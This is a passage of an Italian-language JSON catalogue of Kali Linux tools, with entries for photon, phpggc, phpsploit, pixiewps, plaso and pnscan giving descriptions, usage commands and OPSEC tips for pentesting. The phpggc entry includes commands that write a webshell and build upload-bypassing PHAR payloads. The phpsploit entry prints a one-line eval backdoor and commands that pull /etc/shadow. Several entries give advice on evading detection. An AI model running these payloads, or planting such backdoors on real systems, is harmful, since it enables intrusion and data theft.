servizi (SMB, LDAP, HTTP) e ottenere esecuzione di codice o privilegi elevati senza conoscere la password.</p><p><strong>Security Assessment:</strong> Dimostrare il rischio della configurazione predefinita di Windows che invia automaticamente credenziali NTLM a server remoti. Giustificare l'implementazione di GPO che bloccano l'autenticazione NTLM verso server esterni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Connettività:</strong> La macchina della vittima deve poter raggiungere il server dell'attaccante sulla porta configurata. Firewall aziendali che bloccano le connessioni outbound su porte non standard impediranno la cattura dell'hash.</p><p><strong>SMB Signing:</strong> Se si utilizza NTLM relay (anziché cracking), il relay verso target con SMB signing obbligatorio sarà bloccato. Tuttavia, il relay verso HTTP, LDAP e MSSQL non è influenzato da SMB signing.</p><p><strong>Detection:</strong> Soluzioni EDR avanzate possono rilevare la connessione NTLM outbound verso IP sconosciuti. Microsoft Defender for Office 365 può ispezionare i documenti prima della consegna e rilevare template injection sospette.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "photon",
    "name": "photon",
    "version": "1.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/photon/",
    "desc": "Web crawler veloce per estrazione URL, email, endpoint API, chiavi e secrets.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Photon</strong> è un web crawler Python multi-threaded progettato specificamente per <strong>OSINT e reconnaissance offensiva</strong>. A differenza dei crawler generici, Photon è ottimizzato per estrarre dati utili per i penetration tester: URL interni ed esterni, indirizzi email, sottodomini, endpoint API, file scaricabili, chiavi API esposte e token nel codice JavaScript frontend. Il suo parser JavaScript analizza i file .js referenziati dal sito per identificare endpoint nascosti e secret hardcoded che non sarebbero visibili navigando normalmente. Photon organizza automaticamente i risultati in file separati per tipo (URL, email, file, subdomini), pronti per essere utilizzati come input per i tool successivi della catena di ricognizione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Intelligent JS Parsing:</strong> Analizza tutti i file JavaScript referenziati dal sito, estraendo endpoint API (percorsi relativi come <code>/api/v2/users</code>), URL hardcoded, token e chiavi API esposte nel codice frontend. Questo è uno dei vettori più efficaci per scoprire funzionalità nascoste delle applicazioni web.</p><p><strong>Multi-Type Data Extraction:</strong> Estrae automaticamente e categorizza: URL interni (stessa pagina e subpath), URL esterni (domini terzi collegati), indirizzi email, sottodomini scoperti nei link, file scaricabili (PDF, DOC, XLS, archivi) e form con i loro parametri.</p><p><strong>High-Speed Multi-Threading:</strong> Crawler multi-threaded con controllo del numero di thread e della profondità di crawling. Può processare siti di grandi dimensioni in pochi minuti grazie alla parallelizzazione delle richieste.</p><p><strong>DNS & Subdomain Discovery:</strong> Durante il crawling, identifica automaticamente sottodomini dai link trovati nel sito, dalle intestazioni dei redirect e dai file JavaScript, aggiungendo un layer di subdomain discovery passiva.</p><p><strong>Secret Detection:</strong> Pattern matching integrato per identificare chiavi API (AWS, Google Maps, Stripe), token OAuth, JWT, password hardcoded e altri secret esposti nel codice frontend o nelle risposte HTML.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare Photon specificando l'URL target. I risultati vengono salvati automaticamente in una directory organizzata.</p><pre><code># Crawling base di un sito\nphoton -u https://target.com\n\n# Crawling con profondità 3 e 10 thread\nphoton -u https://target.com -l 3 -t 10\n\n# Crawling con estrazione file JavaScript\nphoton -u https://target.com --keys\n\n# Escludere percorsi specifici (logout, API rate-limited)\nphoton -u https://target.com --exclude logout,signout,api/rate\n\n# Salvare in directory specifica\nphoton -u https://target.com -o /tmp/recon_target/\n\n# Crawling attraverso un proxy (Burp)\nphoton -u https://target.com --proxy http://127.0.0.1:8080\n\n# Con cookie di autenticazione per crawlare aree protette\nphoton -u https://target.com --cookies \"session=abc123;token=xyz\"\n\n# User-Agent personalizzato\nphoton -u https://target.com --user-agent \"Mozilla/5.0 (Windows NT 10.0)\"</code></pre><p>I risultati vengono salvati in file separati nella directory di output: <code>internal.txt</code>, <code>external.txt</code>, <code>emails.txt</code>, <code>files.txt</code>, <code>subdomains.txt</code>, <code>keys.txt</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Application Reconnaissance:</strong> Mapping completo della superficie di attacco di un'applicazione web. I file JavaScript parsati spesso rivelano endpoint API non documentati, pannelli di admin, funzionalità di debug e percorsi di upload.</p><p><strong>OSINT:</strong> Raccolta di indirizzi email, nomi di dipendenti (dai contatti), sottodomini e relazioni con servizi terzi. Le email trovate possono essere usate per password spraying o spear-phishing.</p><p><strong>Bug Bounty:</strong> Secret hunting nei file JavaScript frontend. Chiavi API esposte (Google Maps, AWS, Stripe) sono finding comuni e spesso di severità alta nei programmi di bug bounty.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Volume di traffico:</strong> Il crawling genera centinaia o migliaia di richieste HTTP verso il target, facilmente visibile nei log del web server. Usare delay tra le richieste e limitare la profondità per ridurre la visibilità.</p><p><strong>User-Agent:</strong> Il User-Agent predefinito è identificabile come crawler. Personalizzare con un User-Agent browser standard per ridurre la rilevabilità.</p><p><strong>WAF e Rate Limiting:</strong> Siti protetti da WAF (Cloudflare, AWS WAF) possono bloccare il crawling automatico. Usare proxy e cookies validi per aumentare la compatibilità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "phpggc",
    "name": "phpggc",
    "version": "0.20230428",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/phpggc/",
    "desc": "Genera payload di deserialization per framework PHP: Laravel, Symfony, WordPress.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PHPGGC</strong> (PHP Generic Gadget Chains) è un tool per la generazione di payload di <strong>PHP Object Injection / Deserialization</strong> che sfruttano le classi presenti nei framework PHP più diffusi. Quando un'applicazione PHP utilizza la funzione <code>unserialize()</code> su input controllato dall'utente, un attaccante può iniettare oggetti PHP serializzati con proprietà manipolate. Se nell'applicazione (o nelle sue dipendenze) esistono classi con metodi magici (<code>__destruct()</code>, <code>__toString()</code>, <code>__wakeup()</code>) che eseguono operazioni pericolose, questi oggetti possono essere concatenati in una \"gadget chain\" che porta a <strong>Remote Code Execution</strong>, scrittura di file arbitrari o SSRF. PHPGGC contiene centinaia di gadget chains pre-costruite per framework come Laravel, Symfony, WordPress, Magento, Drupal, Yii, CakePHP, Guzzle, Monolog e molti altri, eliminando la necessità di costruire manualmente la catena di exploit.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Gadget Chain Library:</strong> Database di centinaia di gadget chains categorizzate per framework e versione. Ogni chain specifica il framework target, la versione vulnerabile, il tipo di primitiva ottenibile (RCE, file write, file read, SSRF) e le classi coinvolte nella catena.</p><p><strong>Multiple Primitive Types:</strong> Non solo RCE. PHPGGC supporta diverse primitive: esecuzione di comandi di sistema (<code>system()</code>, <code>exec()</code>), scrittura di file arbitrari (webshell), lettura di file (info disclosure), SSRF (richieste HTTP dal server), e SQL injection tramite oggetti database.</p><p><strong>PHAR Deserialization:</strong> Genera file PHAR (PHP Archive) che triggerano automaticamente la deserializzazione quando acceduti tramite wrapper <code>phar://</code>. Questa tecnica bypassa le protezioni su <code>unserialize()</code> perché il trigger avviene internamente in funzioni come <code>file_exists()</code>, <code>fopen()</code>, <code>file_get_contents()</code> quando accettano percorsi <code>phar://</code>.</p><p><strong>Encoding & Wrapping:</strong> Output in formati multipli: serializzato raw, Base64, URL-encoded, JSON. Supporta wrapping personalizzato del payload per adattarsi al contesto di iniezione specifico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Identificare il framework e la versione del target, poi selezionare la gadget chain appropriata.</p><pre><code># Elencare tutte le gadget chains disponibili\nphpggc -l\n\n# Filtrare per framework\nphpggc -l Laravel\nphpggc -l Symfony\n\n# Generare payload RCE per Laravel\nphpggc Laravel/RCE1 system 'id'\n\n# Output in Base64 (per injection in parametri)\nphpggc -b Symfony/RCE4 exec 'whoami'\n\n# Output URL-encoded\nphpggc -u Laravel/RCE5 system 'cat /etc/passwd'\n\n# Generare file PHAR per deserialization via phar://\nphpggc --phar phar -o exploit.phar Laravel/RCE1 system 'id'\n\n# Generare PHAR come JPEG (bypass upload filter)\nphpggc --phar phar-jpg -o exploit.jpg Monolog/RCE1 system 'id'\n\n# File write (scrivere webshell)\nphpggc Symfony/FW1 /var/www/html/shell.php '&lt;?php system($_GET[\"cmd\"]);?&gt;'\n\n# Con wrapper fast-destruct (trigger immediato)\nphpggc -f Laravel/RCE1 system 'id'\n\n# Informazioni su una gadget chain specifica\nphpggc -i Laravel/RCE1</code></pre><p>Il payload generato va inserito nel punto di injection dove l'applicazione chiama <code>unserialize()</code> sull'input utente. Per PHAR, il file va caricato sul server e acceduto tramite <code>phar://</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>PHP Deserialization Exploitation:</strong> Quando si identifica una vulnerabilità <code>unserialize()</code> in un'applicazione PHP, PHPGGC fornisce gadget chains pronte per ottenere RCE senza dover analizzare manualmente il codebase del framework alla ricerca di classi sfruttabili.</p><p><strong>PHAR Deserialization:</strong> Sfruttare funzioni PHP che accettano percorsi file (<code>file_exists()</code>, <code>is_file()</code>, <code>getimagesize()</code>) per triggerare deserializzazione tramite wrapper <code>phar://</code>, anche quando <code>unserialize()</code> non è chiamata direttamente su input utente.</p><p><strong>Web Application Penetration Testing:</strong> Test di applicazioni basate su framework PHP popolari per verificare la presenza di vulnerabilità di deserializzazione. La varietà di gadget chains copre la maggior parte degli scenari reali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Version Matching:</strong> La gadget chain deve corrispondere alla versione esatta del framework/libreria installata sul target. Una chain per Laravel 8 non funzionerà su Laravel 10 se le classi coinvolte sono state modificate o rimosse.</p><p><strong>WAF Detection:</strong> I payload serializzati PHP contengono pattern riconoscibili (nomi di classi, stringhe come <code>O:xx:</code>) che WAF come ModSecurity possono rilevare. Encoding (Base64, URL-encode) può aiutare a bypassare alcuni filtri.</p><p><strong>Impatto:</strong> L'esecuzione di comandi sul server è un finding critico. In ambienti di produzione, testare con comandi non distruttivi (<code>id</code>, <code>whoami</code>) prima di procedere con azioni più invasive.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Deserialization"
    ],
    "notes": null
  },
  {
    "id": "phpsploit",
    "name": "phpsploit",
    "version": "3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/phpsploit/",
    "desc": "Framework post-exploitation per webshell PHP con tunneling e comandi stealth.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PHPSploit</strong> è un framework di post-exploitation <strong>stealth</strong> progettato per operare attraverso webshell PHP minimaliste. A differenza di webshell tradizionali come c99 o b374k che contengono migliaia di righe di codice PHP facilmente rilevabili dagli antivirus, PHPSploit utilizza una backdoor PHP estremamente piccola (una singola riga come <code>&lt;?php @eval($_SERVER['HTTP_PHPSPL01T']);?&gt;</code>) e invia i comandi da eseguire attraverso header HTTP personalizzati. Tutta la logica complessa (file manager, port scan, privilege escalation) risiede sul lato client (la macchina dell'attaccante), mentre il server ospita solo il minuscolo agent PHP. La comunicazione è crittografata e mascherata come traffico HTTP normale, rendendo il rilevamento estremamente difficile per WAF e IDS basati su signature.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Minimal Agent:</strong> La backdoor PHP sul server è di una sola riga, passando sotto i radar di scanner antivirus e tool di file integrity monitoring. Non contiene funzioni sospette in chiaro: il payload reale viene inviato dinamicamente dal client.</p><p><strong>Encrypted HTTP Tunneling:</strong> Tutti i comandi e le risposte transitano come richieste/risposte HTTP standard, con payload crittografato negli header o nel body. Il traffico appare come navigazione web normale a un IDS/IPS di rete.</p><p><strong>Plugin Ecosystem:</strong> Architettura modulare con plugin per: file system management (browse, upload, download, edit), esecuzione comandi di sistema, port scanning dal server compromesso, reverse shell, privilege escalation helpers, persistence mechanisms, e database interaction.</p><p><strong>Session Management:</strong> Mantiene lo stato tra le sessioni, ricordando directory corrente, variabili d'ambiente e configurazioni. Supporta multiple sessioni simultanee verso diversi server compromessi.</p><p><strong>Evasione WAF:</strong> I moduli stealth utilizzano tecniche di obfuscation PHP dinamiche, encoding variabile e randomizzazione dei pattern per bypassare WAF basati su signature come ModSecurity.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Posizionare l'agent PHP sul server target, poi connettersi con il client PHPSploit.</p><pre><code># 1. Creare l'agent sul server (una riga PHP)\n# &lt;?php @eval($_SERVER['HTTP_PHPSPL01T']);?&gt;\n# Salvare come qualsiasi file .php sul web server\n\n# 2. Avviare PHPSploit e connettersi\nphpsploit\nset TARGET http://target.com/uploads/image.php\nrun\n\n# 3. Comandi nella sessione interattiva\nsystem id                           # esecuzione comandi\nsystem cat /etc/passwd               # lettura file\nupload /tmp/linpeas.sh /var/www/     # upload file\ndownload /etc/shadow /tmp/           # download file\nsystem netstat -tlnp                 # enumerazione rete\n\n# 4. Plugin avanzati\nhelp                                 # lista plugin disponibili\nrun sysinfo                          # informazioni sistema\nrun portscan 192.168.1.1 1-1000      # port scan dal server\n\n# 5. Persistenza\nbackdoor persist                     # crea backup agent</code></pre><p>PHPSploit simula un terminale interattivo: si naviga il filesystem, si eseguono comandi e si gestiscono file come in una shell SSH, ma tutto transita via HTTP.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Web:</strong> Dopo aver ottenuto upload di file su un web server (tramite vulnerabilità upload, LFI to RCE, o SQL injection to file write), PHPSploit fornisce un'interfaccia di post-exploitation completa per enumerazione, pivoting e privilege escalation.</p><p><strong>Red Team C2 Leggero:</strong> In scenari dove C2 framework pesanti (Cobalt Strike, Sliver) non sono praticabili, PHPSploit offre un canale C2 leggero che opera esclusivamente via HTTP/HTTPS, passando attraverso proxy aziendali e firewall.</p><p><strong>Pivoting:</strong> Il server web compromesso diventa un punto di pivot verso la rete interna. Il modulo port scan e le funzionalità di tunneling permettono di esplorare la rete interna attraverso il server web esposto a internet.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>File su disco:</strong> L'agent PHP, per quanto minimale, è un file persistente sul filesystem del server. Scanner periodici o file integrity monitoring (AIDE, OSSEC) possono rilevarlo. Considerare l'uso di tecniche fileless (PHP memory-only) quando possibile.</p><p><strong>Log web server:</strong> Le richieste HTTP verso l'agent vengono loggate nei log di accesso del web server (access.log). Pattern ripetuti di richieste POST allo stesso file possono attirare l'attenzione durante la review dei log.</p><p><strong>PHP Configuration:</strong> La funzione <code>eval()</code> può essere disabilitata dalla configurazione PHP (<code>disable_functions</code>). In tal caso, PHPSploit tenta di usare alternative come <code>assert()</code>, <code>preg_replace()</code> con flag /e, o <code>create_function()</code>.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Persistence"
    ],
    "notes": null
  },
  {
    "id": "pixiewps",
    "name": "pixiewps",
    "version": "1.4.2",
    "icon": "../app/icons/pixiewps-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pixiewps/",
    "desc": "Exploita vulnerabilità Pixie Dust in WPS per recuperare PIN e password WiFi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pixiewps</strong> è uno strumento che sfrutta la vulnerabilità <strong>Pixie Dust</strong> (scoperta da Dominique Bongard nel 2014) presente in implementazioni deboli del protocollo <strong>WPS (Wi-Fi Protected Setup)</strong>. WPS permette di connettere dispositivi a una rete WiFi inserendo un PIN numerico di 8 cifre. La vulnerabilità Pixie Dust risiede nel fatto che alcuni chipset WiFi (Ralink, Realtek, Broadcom) utilizzano generatori di numeri casuali deboli o prevedibili durante lo scambio crittografico WPS. Pixiewps analizza i nonce (<code>E-Nonce</code>) e gli hash (<code>E-Hash1</code>, <code>E-Hash2</code>) scambiati durante il primo messaggio dell'handshake WPS e calcola il PIN <strong>offline</strong> in pochi secondi, anziché le ore necessarie per un brute force online tradizionale. Una volta ottenuto il PIN WPS, si recupera la password WPA/WPA2 della rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Offline PIN Recovery:</strong> Calcola il PIN WPS offline analizzando i parametri crittografici (PKE, PKR, E-Hash1, E-Hash2, AuthKey, E-Nonce) catturati durante un singolo scambio WPS. Non richiede ulteriori interazioni con il router dopo la cattura iniziale, rendendo l'attacco quasi istantaneo.</p><p><strong>Weak PRNG Exploitation:</strong> Sfrutta generatori di numeri pseudocasuali deboli in chipset specifici. Quando il PRNG è prevedibile, l'E-Nonce può essere calcolato e usato per derivare il PIN. Chipset vulnerabili: Ralink RT3070/RT5370, Realtek RTL8188CUS, alcuni Broadcom.</p><p><strong>Integration con Reaver/Bully:</strong> Progettato per funzionare con l'output di <code>reaver</code> o <code>bully</code>, che gestiscono la comunicazione WPS con il router e catturano i parametri crittografici necessari. Reaver con flag <code>-K 1</code> integra direttamente Pixiewps per un attacco completamente automatizzato.</p><p><strong>Multi-Mode:</strong> Supporta diverse modalità di attacco basate sul tipo di debolezza PRNG: modalità 1 per Ralink (E-Nonce rivelato), modalità 2 per Realtek (PRNG basato su timestamp), modalità 3 per Broadcom (seed prevedibile).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Workflow: usare Reaver per catturare i parametri WPS, poi Pixiewps per calcolare il PIN offline.</p><pre><code># Metodo 1: Reaver con Pixie Dust integrato (automatico)\nreaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv\n# -K 1 attiva Pixie Dust automaticamente\n\n# Metodo 2: Cattura manuale con Reaver + Pixiewps separato\n# Prima cattura i parametri con Reaver verbose\nreaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv 2&gt;&amp;1 | tee reaver.log\n# Poi estrai PKE, PKR, E-Hash1, E-Hash2, AuthKey dal log\npixiewps -e PKE_VALUE -r PKR_VALUE -s E-HASH1 -z E-HASH2 -a AUTH_KEY -n E-NONCE\n\n# Con tutti i parametri espliciti\npixiewps --pke PKE --pkr PKR --e-hash1 HASH1 --e-hash2 HASH2 \\\n  --authkey KEY --e-nonce NONCE\n\n# Se il PIN è trovato, usarlo con Reaver per ottenere la password WPA\nreaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p PIN_TROVATO\n\n# Alternativa: usare Bully (altro tool WPS)\nbully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3</code></pre><p>Se il router è vulnerabile, il PIN viene calcolato in 1-30 secondi. Il PIN recuperato permette di ottenere la password WPA/WPA2 della rete con un singolo tentativo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>WiFi Penetration Testing:</strong> Verifica se i router dell'organizzazione sono vulnerabili a Pixie Dust. Molti router consumer e small business hanno ancora WPS abilitato con chipset vulnerabili, specialmente modelli più vecchi.</p><p><strong>Security Audit:</strong> Dimostrare il rischio di WPS abilitato durante un audit di sicurezza wireless. L'attacco Pixie Dust recupera la password WiFi in secondi, giustificando la raccomandazione di disabilitare WPS.</p><p><strong>Rapid WiFi Assessment:</strong> In engagement con tempo limitato, Pixie Dust è il metodo più veloce per ottenere accesso a una rete WiFi (quando funziona), molto più rapido del dictionary attack sull'handshake WPA.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Chipset-Dependent:</strong> L'attacco funziona solo su router con chipset WPS vulnerabili. Router recenti di marchi come TP-Link, Asus e Netgear hanno patchato il PRNG. Tuttavia, molti router ISP-provided e modelli budget restano vulnerabili.</p><p><strong>Interazione minima:</strong> L'attacco richiede un solo scambio WPS con il router (una sola richiesta M1-M3), generando traffico wireless minimo. La fase di calcolo è completamente offline e non genera alcun traffico.</p><p><strong>Mitigazione:</strong> La difesa è semplice: disabilitare WPS nel pannello di amministrazione del router. Non esiste patch software che risolva completamente la debolezza del PRNG su chipset legacy.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "plaso",
    "name": "plaso",
    "version": "20241006",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/plaso/",
    "desc": "Super timeline forensics: correla eventi da log, filesystem, registry, browser.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Plaso</strong> (acronimo islandese per \"Plaso Langar Að Safna Öllu\" - \"Plaso vuole raccogliere tutto\") è il motore di <strong>super-timeline forensics</strong> più avanzato disponibile. Estrae e normalizza timestamp da oltre <strong>100 formati di sorgenti</strong> diverse: filesystem (NTFS, ext4, HFS+, FAT), Registry Windows, Event Log, log Syslog, cronologia browser (Chrome, Firefox, Safari, IE/Edge), email (PST, mbox, EML), database SQLite, prefetch files, Shellbags, USN Journal, $MFT e molti altri. Il risultato è una <strong>timeline unificata</strong> che correla cronologicamente tutti gli eventi del sistema, permettendo ai forensic analyst di ricostruire con precisione la sequenza di azioni: quando un malware è stato scaricato, eseguito, ha stabilito persistenza, ha esfiltrato dati e ha tentato il lateral movement. Plaso è il backend di <strong>Timesketch</strong> (piattaforma di analisi timeline collaborativa di Google) ed è lo standard de facto per la timeline analysis nella digital forensics.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Parsing (100+ parsers):</strong> Include parser per: $MFT e $UsnJrnl (NTFS), Event Log (evtx), Registry hive (SAM, SYSTEM, SOFTWARE, NTUSER.DAT), Prefetch files, Shellbags, SRUM database, Chrome/Firefox/Safari history e cache, file LNK, Jump Lists, Recycle Bin ($I/$R), Syslog, Apache/Nginx access log, Windows Scheduled Tasks, Amcache, e molti altri. Ogni parser estrae tutti i timestamp disponibili dall'artefatto.</p><p><strong>Unified Super-Timeline:</strong> Tutti gli eventi estratti vengono normalizzati in un formato unificato con timestamp, sorgente, tipo di evento, descrizione e metadati aggiuntivi. Questo permette di vedere su una singola linea temporale cosa stava succedendo a livello di filesystem, registry, browser e log di sistema contemporaneamente.</p><p><strong>Filtering e Analysis:</strong> Il tool <code>psort.py</code> permette di filtrare la timeline per intervallo temporale, tipo di sorgente, keyword e altre condizioni. Fondamentale per focalizzare l'analisi su finestre temporali specifiche (es. \"cosa è successo tra le 14:00 e le 15:00 del giorno dell'incidente\").</p><p><strong>Multiple Output Formats:</strong> Esporta in: CSV/L2T CSV (per Excel/spreadsheet), JSON (per scripting), Elasticsearch (per Kibana dashboards), Timesketch (per analisi collaborativa), e formato nativo Plaso per analisi iterative.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il workflow Plaso ha due fasi: estrazione (<code>log2timeline.py</code>) e analisi (<code>psort.py</code>).</p><pre><code># FASE 1: Estrazione - crea il file Plaso dalla sorgente\n# Da immagine disco forense (dd, E01)\nlog2timeline.py timeline.plaso disk_image.dd\nlog2timeline.py timeline.plaso evidence.E01\n\n# Da directory montata (immagine già montata)\nlog2timeline.py timeline.plaso /mnt/evidence/\n\n# Solo parser specifici (più veloce)\nlog2timeline.py --parsers \"winevtx,prefetch,mft\" timeline.plaso /mnt/evidence/\n\n# Con filtri per timezone\nlog2timeline.py --timezone \"Europe/Rome\" timeline.plaso disk.dd\n\n# FASE 2: Analisi - filtra e esporta la timeline\n# Output CSV completo\npsort.py -o l2tcsv timeline.plaso -w timeline.csv\n\n# Filtro per intervallo temporale\npsort.py -o l2tcsv timeline.plaso \"date &gt; '2024-03-15' AND date &lt; '2024-03-16'\" -w day.csv\n\n# Filtro per keyword\npsort.py -o l2tcsv timeline.plaso \"message contains 'mimikatz'\" -w hits.csv\n\n# Output per Timesketch\npsort.py -o timesketch timeline.plaso -w sketch.jsonl\n\n# Output per Elasticsearch\npsort.py -o elastic timeline.plaso --server 127.0.0.1 --port 9200</code></pre><p>Il file <code>.plaso</code> è un database intermedio che può essere ri-analizzato con filtri diversi senza dover rieseguire l'estrazione.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Incident Response:</strong> Ricostruzione completa della timeline di un incidente di sicurezza: dal vettore iniziale di compromissione (email di phishing, exploit web) all'esfiltrazione dei dati, passando per privilege escalation, lateral movement e installazione di persistenza.</p><p><strong>Malware Forensics:</strong> Determinare il momento esatto dell'infezione correlando download del dropper (browser history), esecuzione (Prefetch), persistenza (Registry Run keys), e comunicazioni C2 (network logs).</p><p><strong>Insider Threat Investigation:</strong> Correlare le attività di un utente sospetto: file acceduti (MFT), ricerche effettuate (browser), dispositivi USB collegati (Registry), file copiati (USN Journal) e comunicazioni (email).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Risorse computazionali:</strong> Il parsing completo di un'immagine disco di produzione può richiedere ore e consumare CPU e RAM significative. Dischi da 500GB+ possono generare timeline con milioni di eventi. Pianificare le risorse di conseguenza.</p><p><strong>Storage:</strong> I file .plaso possono essere molto grandi (da GB a decine di GB per dischi di produzione). L'export CSV di una timeline completa può superare i GB. Usare filtri per ridurre il volume.</p><p><strong>Interpretazione:</strong> La timeline grezza contiene milioni di eventi, la maggior parte dei quali sono rumore (attività di sistema normale). L'abilità dell'analista sta nel filtrare e correlare gli eventi significativi. Timesketch facilita l'analisi collaborativa e l'annotazione degli eventi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "pnscan",
    "name": "pnscan",
    "version": "1.14.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pnscan/",
    "desc": "Port scanner multi-threaded leggero per scan rapidi su grandi range di IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pnscan</strong> è un port scanner multi-threaded scritto in C, progettato per la massima velocità nella scansione di grandi range di indirizzi IP. A differenza di nmap che offre un set completo di funzionalità (service detection, scripting, OS fingerprinting), Pnscan si concentra su un compito specifico: determinare rapidamente se una porta è aperta su migliaia o milioni di host. Il suo approccio minimalista lo rende estremamente efficiente in termini di risorse: un singolo binario C senza dipendenze che può saturare la capacità di rete disponibile. Supporta la specifica di range IP in formato CIDR o start-end, con opzionale content matching per filtrare risposte basate su pattern nel banner ricevuto.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-threaded Architecture:</strong> Utilizza thread pool configurabile per connessioni TCP parallele. Il numero di thread può essere regolato per bilanciare velocità e carico di rete. Con centinaia di thread, può scansionare intere classi B in pochi minuti.</p><p><strong>Content Matching:</strong> Dopo la connessione TCP, Pnscan può inviare una stringa di trigger e attendere una risposta, filtrando i risultati in base a pattern specifici nel banner. Questo permette di cercare non solo porte aperte, ma servizi specifici (es. versioni particolari di SSH o HTTP).</p><p><strong>Flexible Range Specification:</strong> Supporta notazione CIDR (192.168.0.0/16), range espliciti (10.0.0.1-10.0.255.254), e combinazioni. Può processare anche liste di target da file per scan mirati.</p><p><strong>Lightweight Binary:</strong> Compilato in C puro senza dipendenze esterne, il binario è di pochi KB. Può essere facilmente trasferito e eseguito su sistemi compromessi per discovery interna senza installare tool pesanti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi base è <code>pnscan [opzioni] range porta</code>. Il range IP è specificato come CIDR o start:end.</p><pre><code># Scan porta 80 su classe C\npnscan 192.168.1.0/24 80\n\n# Scan porta 22 su classe B con 200 thread\npnscan -t 200 10.0.0.0/16 22\n\n# Con content matching - cerca server Apache\npnscan -w 'GET / HTTP/1.0\\r\\n\\r\\n' -r 'Apache' 192.168.0.0/16 80\n\n# Scan range esplicito per SSH\npnscan 10.0.0.1:10.0.0.254 22\n\n# Timeout connessione ridotto (ms) per scan più veloce\npnscan -T 500 172.16.0.0/12 445\n\n# Salva risultati su file\npnscan 192.168.0.0/16 3389 > rdp_hosts.txt\n\n# Combinazione: trova web server e identifica versione\npnscan -w 'HEAD / HTTP/1.0\\r\\n\\r\\n' -r 'Server:' 10.0.0.0/8 80\n\n# Discovery rapida SMB su rete interna\npnscan -t 500 -T 1000 172.16.0.0/16 445</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Initial Network Discovery</strong>, pnscan è il primo tool da usare quando si ha un ampio scope di IP e si vuole identificare rapidamente gli host attivi su porte specifiche. Molto più veloce di nmap per scan su larga scala quando serve solo la lista degli host con porta aperta.</p><p>Per <strong>Internal Pivot Reconnaissance</strong>, dopo aver compromesso un host interno, pnscan (grazie al suo binario minimale) può essere trasferito facilmente per discovery rapida della rete interna senza installare tool complessi.</p><p>Per <strong>Service-Specific Hunting</strong>, la funzione di content matching permette di cercare versioni specifiche di servizi vulnerabili su grandi range. Esempio: cercare tutti i server Apache 2.4.49 vulnerabili a path traversal su un intero ASN.</p><p>Per <strong>Pre-Nmap Triage</strong>, su network molto grandi (classe A), pnscan identifica rapidamente gli host con porte aperte, generando una lista target ridotta per scan nmap dettagliati successivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Volume di Traffico:</strong> Scan con centinaia di thread generano picchi di traffico SYN facilmente rilevabili da IDS/IPS. Il pattern di connessioni sequenziali su IP consecutivi è una firma classica di port scanning.</p><p><strong>Firewall Rate Limiting:</strong> Molti firewall moderni implementano SYN rate limiting che può rallentare o bloccare scan aggressivi. Ridurre i thread e aumentare i timeout per 